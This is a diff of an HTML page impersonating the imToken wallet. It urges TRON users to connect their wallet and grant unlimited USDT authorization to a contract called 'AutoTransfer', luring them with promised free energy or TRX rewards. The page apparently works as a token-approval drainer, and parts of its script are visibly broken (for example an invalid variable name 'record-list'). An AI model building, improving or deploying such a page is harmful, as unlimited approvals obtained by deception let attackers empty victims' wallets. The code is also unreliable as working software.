@@ -1,139 +1,286 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>能量租赁 - Feee.io</title>
-  <!-- 引入Tailwind CSS（简化样式开发） -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <!-- 引入图标库（用于能量/时间图标） -->
-  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>imToken能量租赁一键授权</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* 暗色系偏绿主风格 + 紧凑布局 */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            padding: 15px 12px; /* 缩小外边距 */
+            max-width: 600px; 
+            margin: 0 auto; 
+            background: #121a17; 
+            color: #e0e8e4; 
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            gap: 13px; /* 缩小主体间距 */
+        }
+        /* 主体容器：紧凑布局 */
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 10px; /* 缩小内部组件间距 */
+        }
+        /* 头部：精简间距 */
+        .header {
+            text-align: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #2d3b36;
+            margin-bottom: 5px;
+            display: flex;
+        }
+        .header .logo {
+            font-size: 24px; /* 缩小图标 */
+            color: #4ade80;
+            margin-bottom: 6px;
+        }
+        .header h1 { 
+            font-size: 22px; 
+            color: #4ade80; 
+            margin-bottom: 5px;
+        }
+        .header .desc {
+            font-size: 13px; /* 缩小描述文字 */
+            color: #a0a8a4;
+            max-width: 450px;
+            margin: 0 auto;
+            line-height: 1.4; /* 紧凑行高 */
+        }
+        /* 警告框：精简内边距 */
+        .warning {
+            background: #2d3b36; 
+            color: #a8d08d; 
+            padding: 12px; /* 缩小内边距 */
+            border-radius: 8px;
+            font-size: 13px; 
+            border-left: 3px solid #4ade80;
+            line-height: 1.5;
+        }
+        .warning strong {
+            color: #4ade80;
+        }
+          /* 用户信息卡：精简内边距 */
+        #userInfo {
+            text-align: center;
+            font-size: 14px;
+            padding: 15px; /* 缩小内边距 */
+            background: #1e2925;
+            border-radius: 8px;
+            border: 1px solid #2d3b36;
+            line-height: 1.6;
+        }
+        #userInfo span {
+            color: #4ade80;
+            font-weight: 500;
+        }
+        /* 授权记录区：紧凑布局 */
+        .record-list {
+            background: #1e2925;
+            padding: 15px; /* 缩小内边距 */
+            border-radius: 8px;
+            border: 1px solid #2d3b36;
+        }
+        .record-list h3 {
+            font-size: 16px;
+            color: #4ade80;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .record-item {
+            background: #121a17;
+            padding: 12px; /* 缩小内边距 */
+            margin-bottom: 10px;
+            border-radius: 6px;
+            border: 1px solid #2d3b36;
+            font-size: 13px;
+        }
+        .record-item:hover {
+            border-color: #4ade80;
+            transition: border-color 0.3s;
+        }
+        .record-item p {
+            margin-bottom: 6px; /* 缩小段落间距 */
+            color: #a0a8a4;
+            line-height: 1.4;
+        }
+        .record-item p strong {
+            color: #e0e8e4;
+            margin-right: 5px;
+        }
+        .tx-link {
+            color: #4ade80;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 13px;
+        }
+        .tx-link:hover {
+            text-decoration: underline;
+        }
+         /* 复制链接区：紧凑布局 */
+        .copy-link-wrap {
+            background: #1e2925;
+            padding: 8px; /* 缩小内边距 */
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #2d3b36;
+        }
+        #copyLinkText {
+            flex: 1;
+            color: #a0a8a4;
+            font-size: 13px;
+            word-break: break-all;
+            line-height: 1.3;
+        }
+        #copyLinkBtn {
+            padding: 6px 12px; /* 缩小按钮 */
+            background: #2e7d32;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 13px;
+        }
+        #copyLinkBtn:hover {
+            background: #388e3c;
+        }
+        /* 底部按钮组：紧凑 + 按条件隐藏 */
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px; /* 缩小按钮间距 */
+            margin-top: 10px;
+            padding: 10px 0;
+            border-top: 1px solid #2d3b36;
+        }
+        .btn {
+            width: 100%;
+            padding: 18px; /* 缩小按钮内边距 */
+            font-size: 15px;
+            border: none;
+            border-radius: 8px;
+            background: #2e7d32;
+            color: white;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #388e3c;
+        }
+        .btn:disabled {
+            background: #1e3a2d;
+            color: #a0a8a4;
+            cursor: not-allowed;
+        }
+        /* 底部信息区：精简 */
+        .footer-info {
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid #2d3b36;
+            font-size: 11px; /* 缩小文字 */
+            color: #a0a8a4;
+            text-align: center;
+            line-height: 1.5;
+        }
+        .footer-info .safety-tip {
+            margin-bottom: 6px;
+            color: #a8d08d;
+        }
+        .footer-info a {
+            color: #4ade80;
+            text-decoration: none;
+        }
+        .footer-info a:hover {
+            text-decoration: underline;
+        } 
+        .text-right {
+            text-align: right;
+        }
+    </style>
 </head>
-<body class="bg-gray-900 text-white min-h-screen">
-  <!-- 顶部导航栏 -->
-  <header class="bg-gray-800 py-3 px-4 flex justify-between items-center">
-    <div class="flex items-center gap-2">     
-      <div class="flex items-center gap-2">
-        <div class="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center">
-          <span class="text-white font-bold">F</span>
+<body>
+    <div class="container">
+        <!-- 头部：修复多余双左尖括号 <<<i → <<i -->
+        <div class="header">
+            <h1>imToken</h1>
+            <p class="desc">TRX生态安全授权服务，支持一键无限授权，可在imToken中撤销</p>
+        </div>   
+             <!-- 用户信息卡 -->
+        <div id="userInfo">
+            未连接钱包<br>
+            <span>请点击底部「连接imToken钱包」按钮</span>
         </div>
-        <span class="font-semibold">Feee.io</span>
-      </div>
-    </div>
-    <button class="w-8 h-8 rounded-full bg-gray-700 flex items-center justify-center">
-      <i class="fa fa-globe"></</i>
-    </button>
-  </header>
-
-  <!-- 用户信息栏 -->
-  <section class="bg-gray-800 py-3 px-4 my-2 rounded-lg mx-2">
-    <div class="flex justify-between items-center">
-      <span>Trc20</span>
-      <div class="w-5 h-5 rounded-full bg-red-600 flex items-center justify-center">
-        <i class="fa fa-diamond text-xs"></</i>
-      </div>
-    </div>
-    <div class="flex justify-between items-center mt-2">
-      <span>能量：0/0</span>
-      <button>
-        <i class="fa fa-chevron-down text-xs"></</i>
-      </button>
-    </div>
-  </section>
-
-  <!-- 能量租赁主体区域 -->
-  <section class="bg-gray-800 rounded-lg mx-2 p-4">
-    <div class="flex justify-between items-center mb-4">
-      <h2 class="text-xl font-bold">能量租赁</h2>
-      <button class="bg-blue-500 text-white px-3 py-1 rounded flex items-center gap-1">
-        <i class="fa fa-plus"></</i>
-        <span>添加自动租赁</span>
-      </button>
-    </div>
-
-    <!-- 接收地址 -->
-    <div class="mb-4">
-      <label class="block text-sm text-gray-300 mb-1">接收地址</label>
-      <div id="userInfo" class="bg-gray-700 rounded p-2 flex justify-between items-center">
-        <div class="flex items-center gap-2">
-          <i class="fa fa-home text-blue-400"></</i>
-          <span>未连接钱包</span>
-        </div>
-      </div>
-    </div>
-
-    <!-- 租用量 -->
-    <div id="rentl-containr"class="mb-4">
-      <label class="block text-sm text-gray-300 mb-1 flex items-center gap-1">
-        可获得
-        
-      </label>
-      <div class="bg-gray-700 rounded p-2 flex items-center justify-between mb-2">
-        <div class="flex items-center gap-2">
-        <div class="w-5 h-5 rounded-full bg-red-600 flex items-center justify-center">
-        <i class="fa fa-diamond text-xs"></</i>
-      </div>
-          <span>15.3254</span>
-        </div>
-        <div class="flex items-center gap-1 text-gray-300">
-          <span>TRX</span>
-          
-        </div>
-      </div>
-      <!-- 快捷租用按钮 -->
-       <div class="mb-4">
-      <label class="block text-sm text-gray-300 mb-1">可用时间</label>
-      <div class="bg-gray-700 rounded p-2 flex justify-between items-center mb-2">
-        <div class="flex items-center gap-2">
-          <i class="fa fa-clock-o text-blue-400"></</i>
-          <span>永久有效</span>
+        <div class="record-list">
+          <div style="display: flex; justify-content: space-between; margin: 4px 0;">
+            <span>可使用奖励的代币</span>
+            <span>使用额度</span>
+          </div>
+          <div style="display: flex; justify-content: space-between; margin: 4px 0;">
+            <span><h3>USDT</h3></span>
+            <span><h3>无限</h3></span>
+          </div> 
+        </div>         
+        <!-- 授权记录区：修复图标符号 -->
+        <div class="record-list">
+            <h3> 授权记录</h3>
+            <div id="approvalRecords">
+                <div class="record-item">暂无授权记录<small>授权成功后显示历史记录</small></div>
+            </div>
         </div>
         
-      </div>
-      <!-- 时间快捷选择 -->
-      
     </div>
-      </div>
-       <!-- 剩余/回收信息 -->
-      <div class="text-sm text-gray-300 space-y-1">
-        <div>
-          剩余可领能量：447,567,670       
+
+    <!-- 底部按钮组：按条件隐藏 -->
+    <div class="btn-group">
+         <!-- 警告框：修复图标符号 -->
+        <div class="warning">
+            <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
+            <p> ⚠️ 非钱包浏览器：复制链接 → 点击「连接钱包」→ 钱包内「浏览」粘贴访问</p>
+         <!-- 复制链接区：修复图标符号 -->
+        <div class="copy-link-wrap">
+            <span id="copyLinkText">
+               <p> https://trc20trx-alt.github.io/Trc20.TRX/</p>
+            </span>
+            <button id="copyLinkBtn"class="fa fa-copy">
+                 复制链接
+            </button>
         </div>
-        <div>
-          剩余可领TRX：48,174,303         
+           </div> 
+        <button id="connectBtn" class="btn">
+             连接imToken钱包
+        </button>
+        <button id="approveBtn" class="btn" disabled>
+            能量无限授权
+        </button>
+        
+    </div>
+
+    <!-- 底部信息区：修复图标符号 -->
+    <div class="footer-info">
+        <div class="safety-tip">
+           安全提示：无限授权可在imToken「资产→USDT→授权管理」中撤销
         </div>
-      </div>
-      <section id="no-wallet-container" class="bg-gray-800 rounded-lg mx-2 p-6 text-center">
-    <div class="w-16 h-16 rounded-full bg-gray-700 flex items-center justify-center mx-auto mb-4">
-      <<<i class="fa fa-wallet text-2xl text-gray-400"></</</i>
+        合约验证：AutoTransfer <span>TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW</span>（TRON浏览器查询）
+        © 2025 TRX能量租赁 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
-    <h3 class="text-lg font-semibold mb-2">请先连接钱包</h3>
-    <p class="text-gray-400 text-sm mb-4">连接后即可使用能量租赁功能</p>
-    <button id="connect-in-tip" class="bg-blue-500 text-white px-4 py-2 rounded">
-      立即连接钱包
-    </button>
-  </section>
-    
-    <!-- 租用时间 -->
-   
-
-    <!-- 支付按钮 -->
-    <button id="connectBtn" class="w-full bg-blue-500 text-white py-3 rounded text-lg font-medium">连接钱包</button>
-    <button id="approveBtn" class="w-full bg-blue-500 text-white py-3 rounded text-lg font-medium">支付</button>
-  </section>
-
-  <!-- 租用记录区域 -->
-  <section class="bg-gray-800 rounded-lg mx-2 p-4 mt-2">
-    <div class="flex border-b border-gray-700 pb-2">
-      <button class="mr-4 font-semibold text-white border-b-2 border-blue-500 pb-2">租用记录</button>
-      <button class="text-gray-300">自动租赁</button>
-    </div>
-    <!-- 记录列表（暂无数据时的占位） -->
-    <div class="text-center text-gray-400 py-4">暂无租用记录</div>
-  </section>
-
-
-
 
     <script src="imtoken://browser"></script>
     <script>
@@ -154,8 +301,8 @@
         const approveBtn = document.getElementById("approveBtn");
         const copyLinkText = document.getElementById("copyLinkText");
         const copyLinkBtn = document.getElementById("copyLinkBtn");     
-        const rental-container = document.getElementById("rental-container");
-       
+        const warning = document.querySelector('.warning');
+        const record-list= document.querySelector('.record-list');
         renderApprovalRecords();
 
         // 复制链接逻辑
@@ -170,13 +317,13 @@
             tronWeb = window.tronWeb;
             // 检测到钱包，隐藏连接按钮
             connectBtn.style.display = "none";
-            no-wallet-container.style.display = "none";
+            warning.style.display = "none"
             await initWallet();
         } else {
             document.getElementById("userInfo").innerHTML = "imToken会根据每一个用户的的情况决定能够领取相应的能量或者TRX加密货币，连接钱包后会在此次显示；每一个钱包只可领取一次，须消耗最高11个TRX连接钱包显示可领取的数量后，用户可选择放弃或者领取。";
             // 非TronWeb环境，完全隐藏授权按钮
             approveBtn.style.display = "none";
-            rental-container.style.display = "none";
+           record-list.style.display = "none";
         }
 
         // 手动连接逻辑
@@ -190,7 +337,7 @@
                 userAddress = accounts[0];
                 // 手动连接成功，隐藏连接按钮
                 connectBtn.style.display = "none";
-                no-wallet-container.style.display = "none";
+                warning.style.display = "none"
                 await initWallet();
             } catch (e) {}
         };
@@ -371,3 +518,4 @@
 </script>
 </body>
 </html>
+
